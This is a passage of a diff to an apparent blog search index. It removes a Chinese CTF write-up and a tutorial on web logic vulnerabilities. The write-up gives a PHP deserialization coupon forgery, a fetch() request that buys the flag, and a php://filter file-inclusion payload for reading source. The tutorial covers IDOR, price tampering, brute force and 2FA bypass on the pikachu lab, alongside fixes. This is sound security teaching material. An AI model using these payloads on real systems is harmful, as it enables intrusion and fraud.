ICAgICAgLm5hdiBhOmhvdmVyIHsgY29sb3I6ICMwMDY2Y2M7IH0KICAgICAgICAuY29udGVudCB7IHBhZGRpbmc6IDIwcHg7IHRleHQtYWxpZ246IGxlZnQ7IG1pbi1oZWlnaHQ6IDIwcHg7IGNvbG9yOiAjMzMzOyBsaW5lLWhlaWdodDogMS42OyB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICBFbnRlcnByaXNlIE9BIFN5c3RlbQogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9Im5hdiI+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9cHVibGljX25vdGljZXMucGhwIj5Ob3RpY2VzPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/bW9kdWxlPWFib3V0LnBocCI+QWJvdXQgVXM8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9Y29udGFjdC5waHAiPkNvbnRhY3Q8L2E+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGVudCI+CiAgICAgICAgICAgIDw/cGhwIGluY2x1ZGUoJG1vZHVsZSk7ID8+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==
+
+
+
+
+访问绝对路径
+
+
+
+
+访问 flag 文件
+
+比如：flag.php   flag.txt
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>CTF-WP</category>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1505,362 +1861,6 @@ admin&#39;#的密码没变，修改的是admin的密码
       </categories>
       <tags>
         <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>御网杯Web部分题解</title>
-    <url>/2026/06/13/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/index/</url>
-    <content><![CDATA[一、WEB-Snake_Game1. 题目
-
-
-
-2. 解题思路
-题目要求游戏得分要 300，我们可以直接修改前端代码，让初始分&gt;300
-F12
-
-
-
-
-添加覆盖脚本
-
-
-
-修改成功！
-
-
-
-拿到 flag
-
-
-
-
-二、WEB-PHP_Payment1. 题目
-
-2. 解题思路
-根据题目提示知道可以用代金券拿到 Flag，但是我们的余额只有 10 金币，然后输入框里输入 base64 的代金券可以获得 Flag
-
-
-
-
-下载附件，收集信息
-
-
-
-代码审计 apply_coupon.php
-1、包含了另外两个文件
-
-
-2、从 POST 请求中取 coupon 参数，参数为空、解码失败会报错
-
-
-如果 base64 解码出来再反序列化解码后的字符串等于$promo 返回成功。此时 $promo 对象被销毁
-再看models.php 里的类
-
-
-有两个属性，一是代金券金额，一是代金券码。
-含有魔术方法 __destruct()，对象销毁时触发：逻辑是，如果如果 promo_credit 属性存在且是数字，直接加到余额上。
-所以，目标就是，构造一个金额够买 Flag
-3、 构造 代金券
-&lt;?php  class PromoManager &#123;  public $promo_code = &quot;x&quot;;  public $promo_credit = 10000000;&#125;echo base64_encode(serialize(new PromoManager()));?&gt;
-
-
-
-TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEwOiJwcm9tb19jb2RlIjtzOjE6IngiO3M6MTI6InByb21vX2NyZWRpdCI7aToxMDAwMDAwMDt9
-
-
-
-
-
-购买 Flag，看 buy.php
-
-
-
-
-
-
-
-用 POST 方式往 &#x2F;buy.php 传 item&#x3D;flag
-
-
-依据这个 调用 fetch
-fetch(&#x27;/buy.php&#x27;,&#123;method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;,body:&#x27;item=flag&#x27;&#125;).then(r=&gt;r.text()).then(console.log)
-
-拿到 flag
-
-
-
-
-
-三、WEB-Enterprise_OA1. 题目
-
-
-
-2. 解题思路
-根据题目提示，这题考查目录穿越、文件包含
-先尝试访问 flag.php
-
-
-
-include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’
-路径分隔符是 :（冒号），Windows 用的是 ;。这是 Unix&#x2F;Linux 的特征。
-并且服务器是：
-
-
-说明可以用 &#x2F;etc&#x2F;passwd 来探测（因为&#x2F;etc&#x2F;passwd 一定存在、可读、内容可辨识）
-
-读源代码
-
-
-
-用 php 伪协议
-php://filter/read=convert.base64-encode/resource=index.php
-
-
-
-利用 base64 在线解密工具
-PD9waHAKJG1vZHVsZSA9IGlzc2V0KCRfR0VUWydtb2R1bGUnXSkgPyAkX0dFVFsnbW9kdWxlJ10gOiAncHVibGljX25vdGljZXMucGhwJzsKJG1vZHVsZSA9IHN0cl9yZXBsYWNlKCcuLi8nLCAnJywgJG1vZHVsZSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+T0EgU3lzdGVtIFBvcnRhbDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiAnU2Vnb2UgVUknLCBUYWhvbWEsIEdlbmV2YSwgVmVyZGFuYSwgc2Fucy1zZXJpZjsgYmFja2dyb3VuZC1jb2xvcjogI2YwZjJmNTsgdGV4dC1hbGlnbjogY2VudGVyOyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7fQogICAgICAgIC5oZWFkZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA0MDgwOyBjb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGZvbnQtc2l6ZTogMjRweDsgZm9udC13ZWlnaHQ6IGJvbGQ7IH0KICAgICAgICAuY29udGFpbmVyIHsgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGJvcmRlci1yYWRpdXM6IDhweDsgbWFyZ2luOiA0MHB4IGF1dG87IHdpZHRoOiA2MCU7IGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsMCwwLDAuMSk7IH0KICAgICAgICAubmF2IHsgbWFyZ2luLWJvdHRvbTogMzBweDsgYm9yZGVyLWJvdHRvbTogMnB4IHNvbGlkICNlZWU7IHBhZGRpbmctYm90dG9tOiAxMHB4OyB9CiAgICAgICAgLm5hdiBhIHsgbWFyZ2luOiAwIDE1cHg7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgY29sb3I6ICMwMDQwODA7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CiAgICAgICAgLm5hdiBhOmhvdmVyIHsgY29sb3I6ICMwMDY2Y2M7IH0KICAgICAgICAuY29udGVudCB7IHBhZGRpbmc6IDIwcHg7IHRleHQtYWxpZ246IGxlZnQ7IG1pbi1oZWlnaHQ6IDIwcHg7IGNvbG9yOiAjMzMzOyBsaW5lLWhlaWdodDogMS42OyB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICBFbnRlcnByaXNlIE9BIFN5c3RlbQogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9Im5hdiI+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9cHVibGljX25vdGljZXMucGhwIj5Ob3RpY2VzPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/bW9kdWxlPWFib3V0LnBocCI+QWJvdXQgVXM8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9Y29udGFjdC5waHAiPkNvbnRhY3Q8L2E+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGVudCI+CiAgICAgICAgICAgIDw/cGhwIGluY2x1ZGUoJG1vZHVsZSk7ID8+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==
-
-
-
-
-访问绝对路径
-
-
-
-
-访问 flag 文件
-
-比如：flag.php   flag.txt
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>CTF-WP</category>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>逻辑漏洞</title>
-    <url>/2026/06/14/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、逻辑漏洞的概念1、逻辑漏洞的定义逻辑漏洞是指在软件或系统的设计和实现中，由于逻辑错误或缺陷导致的安全问题。这些漏洞不是由于代码编写的错误引起的，而是由于系统设计时的逻辑思路有问题，导致系统在某些情况下无法正常处理，进而被攻击者利用。
-简单理解：就是编程人员的思维逻辑不够严谨造成的漏洞。
-2、逻辑漏洞的危害逻辑漏洞的存在，可能导致系统崩溃、数据泄露、功能异常等问题，严重时甚至可能被黑客利用，对系统安全构成威胁。
-二、逻辑漏洞与常见漏洞类型的区别1、漏洞性质
-逻辑漏洞是由于系统设计中的逻辑错误或缺陷引起的，它们允许攻击者通过非预期的使用方式或操作顺序，规避安全机制或获得未授权的访问。
-其他漏洞是由于系统没有正确验证用户输入的数据，或者编码错误或配置不当引起。
-
-2、攻击方式和目标
-逻辑漏洞需要攻击者了解应用的业务逻辑，通常利用合法用户身份，通过规避或操纵流程实现攻击目标。
-其他常见漏洞是通过注入恶意代码、操纵输入数据或利用错误配置直接攻击网站应用。
-
-3、检测方法
-逻辑漏洞通常不会被防火墙等设备检测到，可以逃逸各种防护，难以通过自动化工具或防火墙检测。需要人工审查和业务逻辑分析，通常通过渗透测试和代码审计发现。
-其他漏洞可以容易被自动化扫描工具、防火墙(如WAF,Web应用防火墙)和入侵检测系统(IDS)发现。
-
-三、逻辑漏洞的分类逻辑漏洞进行分类的话大致可以分为以下几种类型：
-1、越权类漏洞越权类漏洞是一种常见的安全漏洞，发生在用户可以访问或执行其权限范围之外的资源或操作。根据用户试图获取的权限类型，越权漏洞可以分为水平越权和垂直越权。
-2、业务逻辑类漏洞业务逻辑类漏洞是一类与应用程序的业务流程和功能相关的漏洞，发生在应用程序未能正确地实施业务规则或逻辑上出现缺陷，导致攻击者可以利用这些漏洞进行未授权的操作或获取敏感信息。
-3、流程跳过类漏洞流程跳过类漏洞发生在攻击者通过绕过或跳过应用程序中的某些步骤或检查来达到其目的。利用应用程序在处理流程中未正确验证关键步骤或状态的漏洞，从而使攻击者可以规避验证、授权或其他安全机制。
-四、常见的逻辑漏洞1、身份认证安全(1)漏洞产生原因:有些网站对身份认证模块没有做好安全防护，因此导致漏洞产生
-(2)绕过身份认证有以下几种方法:
-暴力破解、撞库(以信息收集找到的凭证作为字典)Cookie&amp;Session类加密
-
-(3)暴力破解测试方法:在没有验证码限制或者一次验证码可以多次使用的地方，可以分为以下几种情况
-爆破用户名。当输入的用户名不存在时，会显示请输入正确用户名，或者用户名不存在已知用户名。比如:已知用户名为admin，密码可以进行字典爆破使用一个常用密码。比如 123456 对大量用户进行爆破
-
-修复方法:
-增加验证码，登录失败的时候，变换验证码。(确保验证码不能被工具识别)限制登录频率，例如，5 分钟内登录失败次数超过 5 次则锁定账号 1 小时。二次验证，可以添加手机验证码或邮箱验证码。
-
-基于这一块内容的练习，可以看pikachu靶场中有相关练习：暴力破解、验证码绕过(onserver)、验证码绕过(on client)、token防爆破?
-2、未授权访问&amp;越权漏洞授权的概念：就是对特定资源的读写权限。简单的说，就是你的权限能让你做什么事情，而验证则表示是否真的可以对这些资源进行读写
-未授权访问的概念：就是指用户在没有通过认证授权的情况下，能够直接访问需要通过认证才能访问到的页面或者文本信息
-越权漏洞的产生：主要是用于开发人员在对数据进行操作时对客户端请求的数据过分相信而遗漏了权限判断
-越权漏洞常发生的位置：修改、重置、找回账户密码、查看、修改其他账户未公开的信息例如个人资料、文件、数据、程序等等，还有与账户关联的一些权限操作
-(1) 越权漏洞分类
-水平越权：指相同权限的不同用户可以互相访问举例：两个不同的班级的学生A和B，通过修改请求，A可以任意修改B的个人信息
-垂直越权：指使用权限低的用户可以访问权限较高的用户举例：同一个班级不同权限的老师和学生，通过修改请求，学生可以修改和查看老师的账号信息
-
-越权分类补充：基于用户ID、基于对象ID、基于文件名、权限框架缺陷；包含：同级别用户越权访问修改删除、未认证账户直接访问功能、低权限账号访问高权限功能。同级别(权限)的用户或者同一角色的不同用户之间，可以越权访问、修改或者删除的非法操作，如果出现此漏洞，那么将可能会造成大批量数据泄露，严重的甚至会造成用户信息被恶意篡改。
-(2) pikachu 靶场
-2.1 水平越权案例
-使用账号kobe/123456登录，正常查看自身信息链接：http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
-
-修改请求参数，访问其他用户信息：
-http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
-
-
-2.2 垂直越权案例
-使用普通用户pikachu/000000登录，页面仅开放查看权限。
-
-直接访问后台编辑页面：/vul/overpermission/op2/op2_admin_edit.php
-
-
-创建之后，再次查看。
-
-漏洞原因：代码仅校验登录状态，未校验用户权限级别
-$link=connect();!check_op2_login(link))&#123;header(&quot;location:op2_login.php&quot;);exit();
-
-3、数据篡改数据篡改分为两方面:业务一致性安全、业务数据安全
-
-业务一致性安全：账号篡改、邮箱和用户名篡改、订单ID更改、商品编号更改、用户ID篡改
-业务数据安全：金额数据篡改、商品数量篡改、最大数量限制突破、本地JS参数修改
-
-(1) 商品编号篡改步骤:提交订单时，抓包修改商品标号，导致商品与价格不符却交易成功举例：100个积分只能换商品编号为001，1000个积分只能换商品编号005，在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换取高积分商品。
-修复：金额不在客户端传入，防止被篡改，如必要，则务必检查交易金额与商品价格或对支付金额做签名校验相关案例: 某积分商城支付漏洞，通过抓包可以修改积分。
-(2) 金额数据篡改（0元购物）步骤: 在提交订单时进行抓包，修改支付的金额或折扣等相关数据。修复：商品信息如金额、折扣等原始数据校验应来自于服务器端，不应接受客户端传来的值。相关案例: 某订单支付时的总价未验证，抓包将支付金额修改为1即可完成付款。
-(3) 大米CMS支付漏洞3.1 直接修改商品价格购买流程分为订购、确认信息、付款三步，可在任意一步抓包修改价格；可尝试修改为小额、负数金额测试漏洞。案例：http://wooyun.2xss.cc/bug_detail.php?wybug_id&#x3D;wooyun-2016-0226613
-3.2 修改支付状态
-字段规则：0代表支付成功，1代表支付失败；未付款时抓包将状态1改为0，绕过付款步骤。
-数据包复用：低价商品请求包复用至高价商品，实现低价购买高价商品。
-
-3.3 修改商品数量示例：单个商品售价10元，抓包修改数量字段qty，改为大数会生成高额订单，改为负数可实现负金额订单。
-4、任意密码重置漏洞概念：任意密码重置漏洞是系统设计缺陷，允许攻击者在未经授权的情况下更改其他用户的密码。
-漏洞常见场景：缺乏身份验证、不安全的重置链接、安全问题或验证码的缺陷以及会话固定攻击。
-案例：抓包修改请求内用户ID，即可篡改其他用户密码，请求示例：
-[id:1,&#x27;password&#x27;admin12345&quot;)
-
-五、逻辑漏洞总结1、经典业务逻辑漏洞案例
-美团APP忘记密码：仅校验手机号+出生年月日身份证片段，存在绕过风险
-网易黑胶VIP首次充值漏洞：多设备复用首次充值优惠，重复享受低价福利
-
-2、历史公开漏洞（1）支付逻辑漏洞
-客户端直接篡改支付金额
-订单数量无负数限制，实现0元购、负数金额订单
-请求重放、参数篡改实现余额倍增、免费下单
-团购、充值类订单参数可篡改
-
-（2）密码找回&#x2F;修改逻辑漏洞
-暴力破解用户凭证
-找回链接、页面泄露用户信息
-验证码、Token设计缺陷，可通用&#x2F;预测
-越权修改任意账号密码
-找回流程、验证步骤可绕过
-
-（3）应用程序逻辑错误
-绕过交易限制、刷取账户余额
-Cookie&#x2F;Session设计缺陷导致任意账号登录
-强制浏览、流程顺序缺陷，遍历数据
-时间校验缺陷（如12306刷票）
-
-（4）越权分类
-新增数据越权
-删除数据越权（如删除他人素材）
-修改数据越权（篡改用户信息）
-查询数据越权（批量泄露信息）
-URL&#x2F;参数越权
-
-（5）验证码安全问题
-客户端实现、可直接绕过&#x2F;爆破
-服务端验证码可重复使用、可预测
-万能验证码、验证码在请求包明文展示
-验证码强度低，可被OCR识别
-无次数、时效限制，可无限爆破
-
-（6）JS敏感信息泄露
-JS文件泄露后台路径、接口API
-前端JS窃取受保护Cookie
-AJAX、前端脚本泄露手机号、邮箱等隐私
-
-3、逻辑漏洞分类梳理（1）交易类
-修改支付价格
-修改支付状态
-修改&#x2F;负数化购买数量
-篡改金额为负数
-请求重放攻击
-数据库并发锁处理不当
-
-（2）业务风控类
-刷取优惠券、重复享受优惠
-套现类漏洞
-
-（3）账号注册类
-重复注册、账号覆盖
-用户名遍历猜解
-
-（4）密码相关
-密码明文存储、未做哈希加密
-无密码强度校验
-
-（5）账号信息类
-用户名&#x2F;邮箱前后空格、大小写处理不当
-手机号格式校验缺陷（如+86前缀绕过）
-
-（6）Cookie&#x2F;Session类
-Cookie存储敏感数据
-Cookie&#x2F;Session可伪造、无合法性校验
-
-（7）登录类
-撞库攻击
-账号劫持
-恶意锁号（无解锁机制）
-传输信道不安全
-凭证本地不安全存储
-
-（8）密码找回类
-越权重置任意密码
-新密码在响应包明文返回
-Token前端可控、无服务端强校验
-头部字段处理不当引发漏洞
-找回流程泄露敏感信息
-
-（9）修改密码类
-越权修改他人密码
-无需验证旧密码即可改密
-
-（10）申诉类
-身份伪造
-申诉流程绕过
-
-（11）信息查询&#x2F;更新类
-越权查询、修改数据
-ID可枚举，批量遍历用户数据
-
-（12）双因素认证(2FA)漏洞
-改密&#x2F;登录后自动跳过二次验证
-OAuth登录未开启2FA
-2FA验证码可爆破、存在竞争条件
-返回值篡改绕过
-链接、功能可绕过2FA
-CSRF攻击禁用2FA
-
-（13）验证码漏洞汇总
-可重用、可预测、无时效&#x2F;次数限制
-客户端生成&#x2F;校验、前端直接绕过
-数据包明文展示验证码
-强度低可被机器识别
-特殊参数绕过、可用于短信&#x2F;邮件轰炸
-
-（14）Session漏洞
-Session可猜测、伪造、泄露
-Session固定攻击
-
-（15）越权细分
-未授权访问
-水平越权（同权限用户互访）
-垂直越权（低权限访问高权限）
-交叉越权
-
-（16）其他漏洞
-ID、随机数生成规则简单，可枚举&#x2F;预测
-接口无访问次数、权限限制
-加密算法误用
-业务执行顺序缺陷
-各类敏感信息泄露
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>逻辑漏洞</category>
-      </categories>
-      <tags>
-        <tag>逻辑漏洞</tag>
       </tags>
   </entry>
   <entry>
